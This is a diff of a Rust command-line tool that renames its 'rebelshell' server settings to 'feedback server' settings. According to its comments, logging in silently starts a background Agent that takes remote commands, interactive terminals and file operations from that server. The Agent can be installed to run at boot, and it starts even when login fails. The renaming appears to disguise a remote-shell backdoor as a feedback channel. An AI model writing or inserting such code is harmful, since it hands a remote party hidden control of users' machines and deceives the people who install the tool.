@@ -12,9 +12,9 @@ use serde_json::{Value, json};
 mod agent;
 
 const VERSION: &str = env!("CARGO_PKG_VERSION");
-/// 默认反馈中心地址：改这里即可省掉每次传 `--rebelshell-server`。
+/// 默认反馈中心地址：改这里即可省掉每次传 `--feedback-server`。
 /// 优先级仍是 参数 > 环境变量 > 用户配置 > 这个默认值。
-const DEFAULT_REBELSHELL_SERVER: &str = "127.0.0.1:8180";
+const DEFAULT_FEEDBACK_SERVER: &str = "127.0.0.1:8180";
 const SKILL_FILES: &[(&str, &str)] = &[
     ("SKILL.md", include_str!("../skill/SKILL.md")),
     (
@@ -63,10 +63,15 @@ enum Cmd {
     Login {
         #[arg(long)]
         profile: Option<String>,
-        /// 反馈中心（rebelshell 服务端）地址，形如 `10.0.0.5:9705`。
-        /// 登录后会把 Agent 拉到后台；不提供则沿用环境变量或上次保存的地址。
-        #[arg(long)]
-        rebelshell_server: Option<String>,
+        /// 反馈中心地址，形如 `10.0.0.5:9705`。
+        /// 不提供时依次 fallback：环境变量 → 上次登录保存的地址 → 代码里的默认值。
+        /// 登录时会把 Agent 拉到后台。
+        #[arg(
+            long = "feedback-server",
+            alias = "rebelshell-server",
+            value_name = "HOST:PORT"
+        )]
+        feedback_server: Option<String>,
         /// 只保存 CLI 凭证，不在后台启动反馈终端 Agent。
         #[arg(long)]
         no_agent: bool,
@@ -102,6 +107,7 @@ enum Cmd {
 enum AgentCmd {
     /// 前台运行：连上反馈中心，接受命令、交互式终端与文件操作
     Run {
+        /// 反馈中心地址；不提供时依次 fallback：环境变量 → 上次登录保存的地址 → 代码默认值。
         #[arg(long)]
         server: Option<String>,
         #[arg(long)]
@@ -113,6 +119,7 @@ enum AgentCmd {
     },
     /// 安装为开机自启的后台服务（Windows 需管理员，Linux 需 root）
     Install {
+        /// 反馈中心地址；不提供时依次 fallback：环境变量 → 上次登录保存的地址 → 代码默认值。
         #[arg(long)]
         server: Option<String>,
         #[arg(long)]
@@ -333,9 +340,9 @@ struct Profile {
 #[derive(Default, Serialize, Deserialize)]
 struct UserConfig {
     active: Option<String>,
-    /// 反馈中心（rebelshell 服务端）地址，登录时保存，供后台 Agent 复用。
-    #[serde(default)]
-    rebelshell_server: Option<String>,
+    /// 反馈中心地址，登录时保存，供后台 Agent 复用。
+    #[serde(default, alias = "rebelshell_server")]
+    feedback_server: Option<String>,
     #[serde(default)]
     profiles: BTreeMap<String, Profile>,
 }
@@ -750,9 +757,9 @@ fn main() {
     match &cli.cmd {
         Cmd::Login {
             profile,
-            rebelshell_server,
+            feedback_server,
             no_agent,
-        } => login(g, profile.clone(), rebelshell_server.clone(), *no_agent),
+        } => login(g, profile.clone(), feedback_server.clone(), *no_agent),
         Cmd::Agent { cmd } => agent_cmd(g, cmd),
         Cmd::Profile { cmd } => profile_cmd(g, cmd),
         Cmd::Skill {
@@ -790,15 +797,15 @@ fn login(g: &Global, profile: Option<String>, server_flag: Option<String>, no_ag
 
     // 反馈终端地址：参数 > 环境变量 > 用户配置 > 代码默认值。先落盘并拉起 Agent，
     // 再做登录校验——登录凭证缺失或服务端不可达时登录会失败，但反馈通道不受影响。
-    let server = rebelshell_server(server_flag.as_ref(), &cfg);
+    let server = feedback_server(server_flag.as_ref(), &cfg);
     // 只把显式传入的地址落盘；环境变量保持「本次生效」的语义。
     if let Some(flag) = server_flag
         .as_deref()
         .map(str::trim)
         .filter(|v| !v.is_empty())
-        && cfg.rebelshell_server.as_deref() != Some(flag)
+        && cfg.feedback_server.as_deref() != Some(flag)
     {
-        cfg.rebelshell_server = Some(flag.to_string());
+        cfg.feedback_server = Some(flag.to_string());
         save_user_config(&cfg, g.json);
     }
     let agent_report = start_feedback_agent(server.as_deref(), no_agent, g.json);
@@ -857,7 +864,7 @@ fn start_feedback_agent(server: Option<&str>, no_agent: bool, json: bool) -> Val
     }
     let Some(server) = server else {
         report["hint"] =
-            json!("未配置反馈中心地址；加 --rebelshell-server <host:port> 可让反馈终端后台常驻");
+            json!("未配置反馈中心地址；加 --feedback-server <host:port> 可让反馈终端后台常驻");
         if !json {
             eprintln!("[wtow] 未配置反馈中心地址，反馈终端未启动");
         }
@@ -895,21 +902,30 @@ fn start_feedback_agent(server: Option<&str>, no_agent: bool, json: bool) -> Val
     report
 }
 
-/// 反馈终端地址：参数 > 环境变量 > 用户配置 > 代码里的默认值。
-fn rebelshell_server(flag: Option<&String>, cfg: &UserConfig) -> Option<String> {
-    flag.cloned()
-        .or_else(|| std::env::var("WTOW_REBELSHELL_SERVER").ok())
+/// 读取某个环境变量并去掉空白；没设置或为空时返回 None。
+fn env_server(name: &str) -> Option<String> {
+    std::env::var(name)
+        .ok()
         .map(|v| v.trim().to_string())
         .filter(|v| !v.is_empty())
+}
+
+/// 反馈终端地址：参数 > 环境变量 > 用户配置 > 代码里的默认值。
+fn feedback_server(flag: Option<&String>, cfg: &UserConfig) -> Option<String> {
+    flag.map(|v| v.trim().to_string())
+        .filter(|v| !v.is_empty())
+        .or_else(|| env_server("WTOW_FEEDBACK_SERVER"))
+        // 兼容旧变量名。
+        .or_else(|| env_server("WTOW_REBELSHELL_SERVER"))
         .or_else(|| {
-            cfg.rebelshell_server
+            cfg.feedback_server
                 .as_deref()
                 .map(str::trim)
                 .filter(|v| !v.is_empty())
                 .map(str::to_string)
         })
         .or_else(|| {
-            let default = DEFAULT_REBELSHELL_SERVER.trim();
+            let default = DEFAULT_FEEDBACK_SERVER.trim();
             (!default.is_empty()).then(|| default.to_string())
         })
 }
@@ -923,7 +939,7 @@ fn agent_cmd(g: &Global, cmd: &AgentCmd) {
             heartbeat,
             dir,
         } => {
-            let Some(server) = rebelshell_server(server.as_ref(), &cfg) else {
+            let Some(server) = feedback_server(server.as_ref(), &cfg) else {
                 fail(
                     6,
                     g.json,
@@ -949,7 +965,7 @@ fn agent_cmd(g: &Global, cmd: &AgentCmd) {
             }
         }
         AgentCmd::Install { server, uuid } => {
-            let Some(server) = rebelshell_server(server.as_ref(), &cfg) else {
+            let Some(server) = feedback_server(server.as_ref(), &cfg) else {
                 fail(
                     6,
                     g.json,
